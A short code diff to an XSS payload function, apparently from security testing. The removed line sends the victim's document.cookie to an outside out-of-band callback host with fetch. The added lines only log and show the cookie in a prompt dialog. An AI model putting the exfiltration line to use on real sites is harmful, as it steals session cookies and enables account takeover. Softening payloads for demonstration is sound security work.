@@ -1,5 +1,7 @@
 function xssPayload() {
-  fetch("https://cgw4tl843mktyk57nc98pp0oyf46swgl.oastify.com/?"+document.cookie)
+  const alertMsg = 'xss ' + document.cookie;
+  console.log(alertMsg);
+  window.prompt(alertMsg);
 }
 
 xssPayload();
